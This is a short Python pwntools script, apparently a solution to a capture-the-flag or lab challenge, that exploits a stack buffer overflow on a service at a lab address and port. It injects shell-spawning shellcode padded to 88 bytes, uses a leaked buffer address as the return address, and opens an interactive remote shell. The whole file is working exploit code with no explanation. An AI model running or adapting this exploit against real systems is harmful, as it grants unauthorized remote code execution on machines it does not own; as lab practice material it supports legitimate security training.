from pwn import *

context.log_level = 'critical'
context.arch = 'amd64'

address = '10.10.73.63'
port = 9004

shellcode = asm(shellcraft.sh())
payload = shellcode
payload += b'A' * (88 - len(shellcode))

with remote(address, port) as target:
	target.recvuntil(b'I\'m waiting for you at')
	buf_addr = p64(int(target.recvline().strip(), 16))
	target.sendline(payload + buf_addr)
	target.interactive()
